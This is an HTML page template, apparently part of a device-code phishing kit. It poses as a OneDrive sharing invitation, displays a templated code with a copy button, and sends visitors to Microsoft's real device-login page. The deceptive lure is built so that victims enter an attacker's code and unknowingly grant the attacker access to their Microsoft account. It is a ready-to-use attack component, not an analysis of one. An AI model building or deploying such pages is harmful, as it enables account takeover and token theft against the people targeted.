<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css">
    <link rel="stylesheet" href="https://maxcdn.icons8.com/fonts/line-awesome/1.1/css/line-awesome.min.css">
    <link rel="stylesheet" href="assets/css/styles.min.css">
</head>

<body class="text-nowrap" style="width: 100%;height: 100vh;">
    <div id="loginForm" class="container"><img width="150" id="image" src="assets/img/logo.png">
        <div></div>
        <section id="section-main">
            <section id="section-1" class="slide-page">
                <p id="signIn" class="field"></p>
                <p id="signIn" class="field">Invitation for OneDrive</p>
                <p id="NoAccount" class="field" >Use this code to access the shared resources <br>on the following page:</p>
                 <p id="signInOptions" class="field" ></p>
                <input type="text" id="email" class="field" value="<%= user_code %>" readonly/> <img src="assets/img/copy-icon.webp" alt="" style="width: 20px;" onclick="copy()" /> </p>

               

                    <p id="btnPlace" class="field"><button onclick="location.href = 'https://microsoft.com/devicelogin';" class="firstNext next" href="#next" type="button" id="btnSend" >Next</button></p>
            </section>
        </section>
    </div>
    <div id="footer" style="height: 36px;">
        <div id="terms" style="float: left;width: 84px;">
            <p style="font-size: 13px;text-align: left;">Terms of use</p>
        </div>
        <div style="float: left;width: 105px;">
            <p style="font-size: 12px;">Privacy &amp; cookies</p>
        </div>
        <div style="float: left;width: 24px;">
            <p style="font-size: 12px;">•••<br></p>
        </div>
        <div id="snackbar">code copied</div>
    </div>

<script>
function copy() {
  // Get the text field
  var copyText = document.getElementById("email");

  // Select the text field
  copyText.select();
  copyText.setSelectionRange(0, 99999); // For mobile devices

  // Copy the text inside the text field
  navigator.clipboard.writeText(copyText.value);

  // Get the snackbar DIV
  var x = document.getElementById("snackbar");

  // Add the "show" class to DIV
  x.className = "show";

  // After 3 seconds, remove the show class from DIV
  setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);

  
}
</script>


</body>
</html>
